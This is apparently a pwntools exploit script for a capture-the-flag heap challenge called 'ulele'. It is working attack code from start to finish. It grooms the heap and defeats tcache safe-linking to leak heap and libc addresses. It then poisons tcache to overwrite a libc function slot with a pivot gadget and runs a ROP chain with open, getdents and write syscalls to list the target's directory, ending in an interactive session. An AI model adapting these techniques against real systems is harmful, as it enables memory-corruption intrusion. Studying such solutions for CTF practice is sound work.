from pwn import *
from sys import *

elf = context.binary = ELF("./ulele")
p = process("./ulele")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'ulele.chal.crewc.tf'
PORT = 1337

cmd = """
b*main
"""
if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)


def add(payload):
	p.sendlineafter(b'>> ', b'1')
	p.sendafter(b': ', payload)


def view(idx):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b': ', str(idx).encode())



def delete(idx):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b': ', str(idx).encode())


def defuscate(x,l=64):
	p = 0
	for i in range(l*4,0,-4): # 16 nibble
		v1 = (x & (0xf << i )) >> i
		v2 = (p & (0xf << i+12 )) >> i+12
		p |= (v1 ^ v2) << i
	return p

def obfuscate(p, adr):
	return p^(adr>>12)



for i in range(200):
	print(i)
	add(str(i).encode())

for i in range(10):
	add(b'A'*0x8) #200-209

for i in range(7):
	delete(i) #0-6

delete(0x107) #7
delete(0x108) #8
delete(7)

view(8)
p.recvuntil(b'Data: ')
heap = defuscate(u64(p.recvline().rstrip().ljust(8, b'\x00'))) - 0x12d00
print(hex(heap))


add(b'X'*8)
add(b'X'*8)

for i in range(5):
	add(str(i)*8)

target = obfuscate(heap+0x12c50, heap+0x12bf0)
add(p64(target))
add(p64(target))
add(p64(target))

#fake chunk for later
payload = p64(0xdeadbeef)*3
payload += p64(0x71)*2
payload += p64(0x21)
payload += p64(0x0)*3
payload += p64(0x4a1)

add(payload)
delete(216+256)

view(216)
p.recvuntil(b'Data: ')
leak = u64(p.recvline().rstrip().ljust(8, b'\x00'))
libc.address = leak - 0x1f6ce0
print(hex(leak), hex(libc.address))

# 224, 215

add(b'X'*8)

for i in range(2):
	add(str(i)*8)

payload = p64(0x71)*12
add(payload)

add(b'/bin/sh\x00') #dummy

delete(101)
delete(215)
delete(224)


free_got = libc.address+0x665c28
# #free_got = libc.address+0x48ec28

target = obfuscate(free_got-0x40-8, heap+0x136e0)
payload = p64(0x0)*10
payload += p64(target)
add(payload)


add(b'dummy')
gadget = libc.address+0x000000000008b635 # mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
print(hex(gadget))
add(p64(gadget)*12)
add(b'dummy')
rop = ROP(libc)
rop.read(0, heap+0x13090, 0x1000)
payload = p64(libc.address+0x0000000000054ff0)
payload += p64(heap+0x13090)
payload += rop.chain()
payload += b'A'*(80-len(payload))
add(payload)

delete(230)

rop2 = ROP(libc)
rop2.read(0, heap, 0x100)
#open
rop2(rax=0x2, rdi=heap, rsi=0x0, rdx=0x0)
rop2.raw(rop2.find_gadget(["syscall", "ret"]))
#getdents
rop2(rax=0x4e, rdi=0x3, rsi=heap, rdx=0x400)
rop2.raw(rop2.find_gadget(["syscall", "ret"]))

#readflag
# rop2.read(0x3, elf.bss()+0x300, 0x100)

#write
rop2.write(1, heap, 0x400)

print(rop2.dump())

payload = b'A'*0x38
payload += rop2.chain()
sleep(2)
# gdb.attach(p,cmd)
p.send(payload)
sleep(1)
p.send(b'.\x00')
p.interactive()


p.interactive()